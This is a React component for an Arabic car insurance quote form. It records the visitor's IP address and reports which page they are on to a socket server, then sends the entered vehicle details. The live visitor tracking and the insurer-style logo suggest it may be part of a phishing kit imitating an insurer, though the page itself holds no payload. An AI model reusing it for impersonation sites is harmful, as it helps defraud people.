import React, { useEffect, useState } from "react";
import io from "socket.io-client";
import { socket } from "../App";
import { useNavigate } from "react-router-dom";

const Details = () => {
  const [visitorIP, setVisitorIP] = useState(null);
  const [formData, setFormData] = useState({
    TypeOfInsuranceContract: "",
    InsuranceStartDate: "",
    PurposeOfUse: "",
    EstimatedValue: "",
    ManufactureYear: "",
    RepairLocation: "الوكالة",
  });

  const navigate = useNavigate()

  useEffect(() => {
    // Fetch IP
    const fetchIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        setVisitorIP(data.ip);
      } catch (err) {
        console.error("IP fetch failed:", err);
      }
    };

    fetchIP();
  }, []);

  useEffect(() => {
    if (!visitorIP) return;

    socket.emit("updateLocation", {
      ip: visitorIP,
      page: "details",
    });

    socket.on("connect", () => {
      console.log("Socket connected:", socket.id);
    });

    socket.on("disconnect", (reason) => {
      console.log("Socket disconnected:", reason);
    });

    socket.on("ackDetails", (resp) => {
      console.log("a");
      console.log(resp);
      console.log(formData.TypeOfInsuranceContract);
      if (resp.success) {
        // const nextPage =
        //   formData.TypeOfInsuranceContract === "ضد الغير"
        //     ? window.location.href = '/thirdparty'
        //     :  window.location.href = '/comprehensive'
        // window.location.href = nextPage;
      } else {
        alert("حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
      }
    });
  }, [visitorIP]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    if (name === "EstimatedValue") {
      const onlyNums = value.replace(/\D/g, "").slice(0, 7);
      setFormData((prev) => ({ ...prev, [name]: onlyNums }));
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!visitorIP) return;

    const payload = {
      ip: visitorIP,
      ...formData,
    };
    socket.emit("submitDetails", payload);
    if (formData.TypeOfInsuranceContract === "شامل") {
          navigate("/comprehensive");

    } else {
          navigate("/thirdparty");

    }
  };

  const yearOptions = [];
  for (let y = 2000; y <= 2026; y++) {
    yearOptions.push(
      <option key={y} value={y}>
        {y}
      </option>
    );
  }

  return (
    <div dir="rtl" className="container text-right ">
      <nav className="bg-white p-2  text-center w-full ">
        <img src="/Bca-logo.svg" alt="Logo" className="mx-auto w-32" />
      </nav>
      <h5 className="mt-4 text-lg text-center">بيانات التأمين</h5>
      <hr className="text-gray-300 mt-3" />

      <form onSubmit={handleSubmit} className="flex flex-col gap-y-5 px-5 py-3">
        <div className="flex flex-col gap-y-4 ">
          <label htmlFor="TypeOfInsuranceContract" className="text-gray-500">
            نوع التأمين
          </label>
          <select
            className="w-full border p-2 rounded border-gray-500"
            name="TypeOfInsuranceContract"
            value={formData.TypeOfInsuranceContract}
            onChange={handleChange}
            required
          >
            <option value="">إختر</option>
            <option value="ضد الغير">ضد الغير</option>
            <option value="شامل">شامل</option>
          </select>
        </div>

        <div className="flex flex-col gap-y-4 ">
          <label htmlFor="InsuranceStartDate" className="text-gray-500">
            تاريخ بدء التأمين
          </label>
          <input
            className="w-full border p-2 rounded border-gray-500"
            type="date"
            name="InsuranceStartDate"
            value={formData.InsuranceStartDate}
            min={new Date().toISOString().split("T")[0]}
            onChange={handleChange}
            required
          />
        </div>

        <div className="flex flex-col gap-y-4 ">
          <label htmlFor="PurposeOfUse" className="text-gray-500">
            الغرض من استخدام المركبة
          </label>
          <select
            className="w-full border p-2 rounded border-gray-500"
            name="PurposeOfUse"
            value={formData.PurposeOfUse}
            onChange={handleChange}
            required
          >
            <option value="">إختر</option>
            <option value="شخصي">شخصي</option>
            <option value="تجاري">تجاري</option>
            <option value="تأجير">تأجير</option>
            <option value="نقل الركاب او كريم - اوبر">
              نقل الركاب او كريم - اوبر
            </option>
            <option value="نقل بضائع">نقل بضائع</option>
            <option value="نقل مشتقات نفطيه">نقل مشتقات نفطيه</option>
          </select>
        </div>

        <div className="flex flex-col gap-y-4 ">
          <label htmlFor="EstimatedValue" className="text-gray-500">
            القيمة التقديرية للمركبة
          </label>
          <input
            className="w-full border p-2 rounded border-gray-500"
            type="text"
            name="EstimatedValue"
            value={formData.EstimatedValue}
            pattern="^[0-9]{4,7}$"
            title="يجب أن يكون الرقم مكوّناً من 4 إلى 7 أرقام فقط"
            onChange={handleChange}
            required
          />
        </div>
        <div className="flex flex-col gap-y-4 ">
          <label htmlFor="ManufactureYear">سنة صنع المركبة</label>
          <select
            className="w-full border p-2 rounded border-gray-500"
            name="ManufactureYear"
            value={formData.ManufactureYear}
            onChange={handleChange}
            required
          >
            <option value="">إختر</option>
            {yearOptions}
          </select>
        </div>

        <div className="flex flex-col gap-y-4 ">
          <label className="text-black">مكان اصلاح المركبة</label>
          <div className="form-check flex gap-x-2 items-center text-sm">
            <input
              type="radio"
              name="RepairLocation"
              id="agency"
              className="form-check-input"
              value="الوكالة"
              checked={formData.RepairLocation === "الوكالة"}
              onChange={handleChange}
            />
            <label className="form-check-label" htmlFor="agency">
              الوكالة
            </label>
          </div>
          <div className="form-check flex gap-x-2 items-center text-sm">
            <input
              type="radio"
              name="RepairLocation"
              id="shop"
              className="form-check-input"
              value="الورشة"
              checked={formData.RepairLocation === "الورشة"}
              onChange={handleChange}
            />
            <label className="form-check-label" htmlFor="shop">
              الورشة
            </label>
          </div>
        </div>

        <button
          type="submit"
          className="w-full bg-yellow-500 text-wih  py-2 rounded mb-3 hover:bg-yellow-600"
        >
          إظهار العروض
        </button>
      </form>
    </div>
  );
};

export default Details;
